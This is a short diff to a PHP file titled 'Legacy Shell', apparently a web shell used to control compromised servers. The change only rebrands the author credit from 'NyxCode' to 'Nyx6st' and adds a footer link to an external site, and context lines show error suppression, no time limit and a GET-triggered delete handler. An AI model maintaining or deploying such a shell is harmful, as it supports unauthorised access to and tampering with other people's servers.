@@ -2,7 +2,7 @@
 error_reporting(0);
 set_time_limit(0);
 
-echo "<!DOCTYPE html><html><head><title>NyxCode | Legacy Shell</title><style>
+echo "<!DOCTYPE html><html><head><title>Nyx6st | Legacy Shell</title><style>
 @font-face {
     font-family: 'Comic Sans MS';
     src: local('Comic Sans MS');
@@ -122,5 +122,10 @@ if(isset($_GET['delete'])){
 }
 
 echo "<hr><center>
-<small>Shell Rebuild by NyxCode | Legacy mode</small></center></body></html>";
+  <small>
+    <a href=\"https://www.0x6ick.zone.id/?m=1\" target=\"_blank\" style=\"text-decoration: none; color: inherit;\">
+      Shell Rebuild by Nyx6st | Legacy mode
+    </a>
+  </small>
+</center>";
 ?>
